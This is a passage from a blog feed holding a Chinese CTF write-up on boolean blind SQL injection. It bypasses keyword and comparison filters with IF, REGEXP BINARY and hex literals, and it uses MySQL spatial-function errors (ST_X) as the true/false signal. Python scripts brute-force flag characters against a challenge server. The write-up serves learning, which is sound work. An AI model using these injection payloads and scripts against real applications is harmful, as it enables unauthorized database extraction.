    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在CTF中，md5的题目太常见了，虽然有很多这方面的文章，但相对来说比较零散，这里主要将自己学习和比赛时遇到的md5弱类型和强碰撞的题目从浅</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>无判断字符，基于运行时错误的bool盲注</title>
    <link href="http://www.yoyo2tong.xyz/2021/01/30/cat/"/>
    <id>http://www.yoyo2tong.xyz/2021/01/30/cat/</id>
    <published>2021-01-30T15:54:33.080Z</published>
    <updated>2021-02-01T07:02:58.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="判断bool盲注"><a href="#判断bool盲注" class="headerlink" title="判断bool盲注"></a>判断bool盲注</h2><p>测试?cat=1和cat=2，cat=10000000返回的都是cat.png，输出1’ 返回none.png，说明存在SQL注入漏洞。</p><p>输入-1，空格，union，sleep等返回的是none.png，通过不断输入测试，判断当输入的内容不包含过滤时，返回cat.png。输入含有过滤的字符时，返回的是nono.png，当输入的sql查询语句有误且不包含过滤字符时，返回空白页面（状态码为500的错误）。由此可以判断是Boolean注入攻击。</p><p>过滤空格想到可以用%09代替，但是过滤union尝试用uniunionon，UNion，和unio\x6e都没有办法绕过。</p><p>接着的想法是利用bool盲注，发现&gt;,&lt;,=,like都被过滤，也就是说不能够通过这些来判断我们输入的语句是否正确。</p><p>接下来需要考虑的问题是如何可以避免使用&lt;,&gt;,=,like进行bool盲注。到这里就卡住了，没有什么想法，发现if函数没有被过滤，就查看mysql中if函数的用法。</p><h2 id="IF函数"><a href="#IF函数" class="headerlink" title="IF函数"></a>IF函数</h2><p>IF(expr1,expr2,expr3)，如果expr1的值为true，则返回expr2的值，如果expr1的值为false，则返回expr3的值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select sex,name from student;</span><br><span class="line">+-----+-------+</span><br><span class="line">| sex | name  |</span><br><span class="line">+-----+-------+</span><br><span class="line">|   0 | name1 |</span><br><span class="line">|   1 | name2 |</span><br><span class="line">|   1 | name3 |</span><br><span class="line">|   0 | name4 |</span><br><span class="line">+-----+-------+</span><br><span class="line">4 rows in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select name,if(sex&#x3D;0,&#39;女&#39;,&#39;男&#39;)as sex from student;</span><br><span class="line">+-------+-----+</span><br><span class="line">| name  | sex |</span><br><span class="line">+-------+-----+</span><br><span class="line">| name1 | 女  |</span><br><span class="line">| name2 | 男  |</span><br><span class="line">| name3 | 男  |</span><br><span class="line">| name4 | 女  |</span><br><span class="line">+-------+-----+</span><br><span class="line">4 rows in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select name,if(0,&#39;女&#39;,&#39;男&#39;)as sex from student;</span><br><span class="line">+-------+-----+</span><br><span class="line">| name  | sex |</span><br><span class="line">+-------+-----+</span><br><span class="line">| name1 | 男  |</span><br><span class="line">| name2 | 男  |</span><br><span class="line">| name3 | 男  |</span><br><span class="line">| name4 | 男  |</span><br><span class="line">+-------+-----+</span><br><span class="line">4 rows in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select sex,name from student;</span><br><span class="line">+-----+-------+</span><br><span class="line">| sex | name  |</span><br><span class="line">+-----+-------+</span><br><span class="line">|   0 | name1 |</span><br><span class="line">|   1 | name2 |</span><br><span class="line">|   1 | name3 |</span><br><span class="line">|   0 | name4 |</span><br><span class="line">+-----+-------+</span><br><span class="line">4 rows in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select database();</span><br><span class="line">+------------+</span><br><span class="line">| database() |</span><br><span class="line">+------------+</span><br><span class="line">| oo         |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt;  SELECT IF(length(database())&gt;8,1, 0)from student;</span><br><span class="line">+-------------------------------+</span><br><span class="line">| IF(length(database())&gt;8,1, 0) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                             0 |</span><br><span class="line">|                             0 |</span><br><span class="line">|                             0 |</span><br><span class="line">|                             0 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">4 rows in set</span><br><span class="line"></span><br><span class="line">mysql&gt;  SELECT IF(length(database())&gt;1,1, 0)from student;</span><br><span class="line">+-------------------------------+</span><br><span class="line">| IF(length(database())&gt;1,1, 0) |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|                             1 |</span><br><span class="line">|                             1 |</span><br><span class="line">|                             1 |</span><br><span class="line">|                             1 |</span><br><span class="line">+-------------------------------+</span><br><span class="line">4 rows in set</span><br></pre></td></tr></table></figure><p>从这里例子我们知道，可以通过返回值的不同来判断bool盲注的结果，且盲注过程中if语句导致的查询结果的变化并不会导致数据库中的值发生变化，例如，在查询过程中我们把0变成女，把1变成男，但是在新的一个查询的，还是一样为0和1.</p><p>但是到这里还是不能避免使用&gt;,&lt;,=,like，通过阅读writeup，我们知道了regexp函数和binary函数</p><h2 id="regexp函数和binary函数"><a href="#regexp函数和binary函数" class="headerlink" title="regexp函数和binary函数"></a>regexp函数和binary函数</h2><p>regexp函数可以匹配正则表达式，而且regexp后面接的内容只要是前面mysql查询结果其中的一部分，就会返回1，否则返回0.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag from flag;</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;^flag&#123;f&#39;;</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;^flag&#123;f&#39; |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">|                                       1 |</span><br><span class="line">+-----------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;lag&#39;;</span><br><span class="line">+-------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;lag&#39; |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">|                                   1 |</span><br><span class="line">+-------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;&#123;&#39;;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;&#123;&#39; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;lf&#39;;</span><br><span class="line">+------------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;lf&#39; |</span><br><span class="line">+------------------------------------+</span><br><span class="line">|                                  0 |</span><br><span class="line">+------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>binary函数将值转换成二进制字符串， SELECT BINARY “ABC”=”abc”，这里的MySQL执行的字符逐字符比较  “ABC”和  “abc”并返回0（因为在字符逐字符的基础上，它们是不等价的）</p><p> SELECT “ABC”=”abc”，这里的MySQL执行的字符逐字符比较  “ABC”和  “abc”并返回1（因为在字符逐字符的基础上，它们是等效的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT BINARY &quot;123abc&quot;;</span><br><span class="line">+-----------------+</span><br><span class="line">| BINARY &quot;123abc&quot; |</span><br><span class="line">+-----------------+</span><br><span class="line">| 123abc          |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT BINARY &quot;ABC&quot;&#x3D;&quot;abc&quot;;</span><br><span class="line">+--------------------+</span><br><span class="line">| BINARY &quot;ABC&quot;&#x3D;&quot;abc&quot; |</span><br><span class="line">+--------------------+</span><br><span class="line">|                  0 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT &quot;ABC&quot;&#x3D;&quot;abc&quot;;</span><br><span class="line">+-------------+</span><br><span class="line">| &quot;ABC&quot;&#x3D;&quot;abc&quot; |</span><br><span class="line">+-------------+</span><br><span class="line">|           1 |</span><br><span class="line">+-------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>两个函数结合起来，跟regexp函数基本一样，但有些许不同，regexp后面接的是大写（查询结果是小写）也可以成功返回1，而regexp binary 不可以。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select flag from flag;</span><br><span class="line">+--------------+</span><br><span class="line">| flag         |</span><br><span class="line">+--------------+</span><br><span class="line">| flag is here |</span><br><span class="line">+--------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary 1;</span><br><span class="line">+----------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary 1 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">|                                      0 |</span><br><span class="line">+----------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary &#39; &#39;;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary &#39; &#39; |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;a&#39;;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;a&#39; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp &#39;A&#39;;</span><br><span class="line">+-----------------------------------+</span><br><span class="line">| (select flag from flag)regexp &#39;A&#39; |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                 1 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary &#39;A&#39;;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary &#39;A&#39; |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                                        0 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; select (select flag from flag)regexp binary &#39;a&#39;;</span><br><span class="line">+------------------------------------------+</span><br><span class="line">| (select flag from flag)regexp binary &#39;a&#39; |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">|                                        1 |</span><br><span class="line">+------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="无判断字符mysql查询"><a href="#无判断字符mysql查询" class="headerlink" title="无判断字符mysql查询"></a>无判断字符mysql查询</h2><p>由此可知，我们可以利用regexp binary在不使用&gt;,&lt;,=,like的情况下，进行bool盲注。与前面没有被过滤的if语句结合起来，可以得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if((select flag from flag)regexp binary &#39;flag is here&#39;,2,3);</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">| if((select flag from flag)regexp binary &#39;flag is here&#39;,2,3) |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">|                                                           2 |</span><br><span class="line">+-------------------------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt;  select if((select flag from flag)regexp binary &#39;flag is &#39;,2,3);</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">| if((select flag from flag)regexp binary &#39;flag is &#39;,2,3) |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">|                                                       2 |</span><br><span class="line">+---------------------------------------------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><p>因为<code>&#39;</code>被过滤，所以binary后面不能带有<code>&#39;</code>,通过writeup发现把<code>&#39;</code>里面的字母换成16进制也可以成功执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select if((select flag from flag)regexp binary 0x20,2,3);</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">| if((select flag from flag)regexp binary 0x20,2,3) |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">|                                                 2 |</span><br><span class="line">+---------------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>到这里的想法就是通过返回的页面来判断是否输入正确，例如在mysql中的实验，输入正确时返回2，输入错误时返回3.但是在这道题中，只有三个返回页面，一个是输入cat.png，一个是nono.png，还有一个是返回空白页面（状态码为500）。如果我们还是使用<code>select if((select flag from flag)regexp binary 0x20,2,3);</code>来进行盲注，因为无论结果是2还是3都是返回正确的图片，因为返回错误图片是在输入含有被过滤的字符时，而不是在我们判断错误时返回（cat=0时返回的也是cat.png)，所有返回nono.png这张图片是我们利用不了的。现在的问题是我们要通过返回cat.png和返回空白页面来判断bool盲注。</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/2.png" alt="2"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/3.png" alt="3"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/4.png" alt="4"></p><p>在这条sql查询语句中，select if((select flag from flag)regexp binary 0x20,expr2,expr3);我们需要返回cat.png的页面只需要让expr2或者expr3为数字即可。返回空白页面（状态码为500）有只有一种情况，当输入语句没有含有过滤字符且不能构成sql语句查询时。也就是说我们输入的查询语句在某些情况下可以构成正确的sql语句，在某些情况下会报错，不能构成正确的mysql查询语句。</p><p>继续看writeup，知道可以利用这些函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF(&#123;&#125;, ST_X(ST_GeomFromText(&#39;POINT(mads)&#39;)), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MULTIPOINT (mads)&#39;),0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_X(MADS), 0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_MPointFromText(&#39;MADS&#39;),0);</span><br><span class="line">SELECT IF(&#123;&#125;, ST_GeomFromText(&#39;MADS&#39;),0);</span><br></pre></td></tr></table></figure><p>我们的目的就是sql注入mysql查询语句，在某些情况下该语句可以执行，在某些情况下该语句执行不了。</p><p>先查看这些函数的用法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ST_GeomFromText方法（根据字符串表示构造几何）</span><br><span class="line"></span><br><span class="line">语法：ST_GemoFromText（character-string,srid)</span><br><span class="line"></span><br><span class="line">character-string:包含几何文本表示的字符串，输入格式可以是任何支持的文本输入格式，包括标准文本（WKT)或扩展标准文本（EWKT）</span><br><span class="line"></span><br><span class="line">srid:类型，interger，默认为0</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ST_X 以 ST_Point 作为输入参数，返回其 x 坐标。在 SQLite 中，ST_X 也可以更新 ST_Point 的 x 坐标。</span><br><span class="line"></span><br><span class="line">语法</span><br><span class="line">st_x (point1 geometryblob)</span><br><span class="line">st_x (input_point geometryblob, new_Xvalue double)</span><br><span class="line">ST_X 函数可用于 SQLite 更新点的 x 坐标。在这种情况下，将返回 geometryblob。</span><br></pre></td></tr></table></figure><p>ST_X是返回一个坐标的x坐标，所以需要用Point函数来传入坐标，ST_GemoFromText函数的作用是将返回的坐标变成字符串。当POINT传入的不是一个坐标时，语句也可以执行，只有当需要返回这个x坐标时才会报错。</p><p>我们可以通过返回的页面来判断bool盲注有没有成功，返回0或任何数字会出现cat.png，mysql查询语句报错会出现空白页面（状态码为500的错误）</p><p>然后发现只要传入ST_X(数字)可以达到一样的效果。也就是SELECT IF({}, ST_X(MADS), 0);只要传入的参数不正确，就可以达到我们想要的效果。</p><p>这里的ST_X等函数在低版本中运行不了</p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/19.png" alt="19"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt;  SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(a)&#39;)), 0);</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">| IF(0, ST_X(ST_GeomFromText(&#39;POINT(a)&#39;)), 0) |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">|                                           0 |</span><br><span class="line">+---------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(aaaa)&#39;)), 0);</span><br><span class="line">ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</span><br><span class="line">mysql&gt;  SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(122)&#39;)), 0);</span><br><span class="line">ERROR 3037 (22023): Invalid GIS data provided to function st_geometryfromtext.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt;  SELECT IF(0, ST_X(ST_GeomFromText(&#39;POINT(1111 1111)&#39;)), 0);</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">| IF(0, ST_X(ST_GeomFromText(&#39;POINT(1111 1111)&#39;)), 0) |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">|                                                   0 |</span><br><span class="line">+-----------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  SELECT IF(1, ST_X(ST_GeomFromText(&#39;POINT(11 12)&#39;)), 0);</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">| IF(1, ST_X(ST_GeomFromText(&#39;POINT(11 12)&#39;)), 0) |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">|                                              11 |</span><br><span class="line">+-------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  SELECT IF(0, ST_X(5), 0);</span><br><span class="line">+-------------------+</span><br><span class="line">| IF(0, ST_X(5), 0) |</span><br><span class="line">+-------------------+</span><br><span class="line">|                 0 |</span><br><span class="line">+-------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt;  SELECT IF(1, ST_X(5), 0);</span><br><span class="line">ERROR 3037 (22023): Invalid GIS data provided to function st_x.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT IF(0, ST_GeomFromText(&#39;a&#39;), 0);</span><br><span class="line">+--------------------------------+</span><br><span class="line">| IF(0, ST_GeomFromText(&#39;a&#39;), 0) |</span><br><span class="line">+--------------------------------+</span><br><span class="line">| 0                              |</span><br><span class="line">+--------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; mysql&gt;SELECT IF(1, ST_GeomFromText(&#39;2&#39;), 0)</span><br><span class="line">    -&gt; ;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;SELECTSELECT IF(1, ST_GeomFromText(&#39;2&#39;), 0)&#39; at line 1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/7.png" alt="7"></p><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/8.png" alt="8"></p><p>据此，我们可以编写判断我们的猜想是否成立，结果是成立的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28059/index.php?cat=1andIF((selectflagfromflag)regexpbinary0x66,0,ST_X(111))&quot;</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line">print(r.status_code)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><p><img src="https://zhuang-yongyi.gitee.io/yoyo/bool%E7%9B%B2%E6%B3%A8/10.png" alt="10"></p><p>到这里，我们可以通过bool盲注来判断我们的输入是否正确，但是，到此，我只能判断有哪些字符在flag中，不能按顺序把字符连接起来得到payload。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ord2hex</span>(<span class="params">string</span>):</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">r = hex(ord(i));</span><br><span class="line">r = r.replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">result = result+r</span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span>+result</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://47.98.234.232:28045/index.php?cat=&quot;</span></span><br><span class="line">tables = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-&#125;&#123;&#x27;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#for i in range(1,70):</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> tables:</span><br><span class="line">payload = <span class="string">&quot;1andIF((selectflagfromflag)regexpbinary%s,0,ST_X(111))&quot;</span>%(ord2hex(j))</span><br><span class="line">r = requests.get(url+payload);</span><br><span class="line"><span class="keyword">if</span>  r.status_code==<span class="number">200</span>:</span><br><span class="line">print(j)</span><br></pre></td></tr></table></figure><p>输出结果</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 